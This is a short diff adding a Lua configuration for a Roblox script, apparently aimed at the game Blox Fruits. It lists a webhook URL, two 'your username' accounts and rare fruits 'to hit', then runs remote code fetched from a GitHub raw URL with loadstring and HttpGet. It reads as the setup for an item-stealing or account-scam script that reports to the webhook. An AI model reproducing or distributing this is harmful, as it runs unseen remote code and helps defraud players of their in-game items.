@@ -1,0 +1,5 @@
+Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/8d3640d4-1c99-4608-adc1-663505e9cef7" -- << Your Webhook
+Usernames = {"liltimmybot75", "Adiletkz91"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
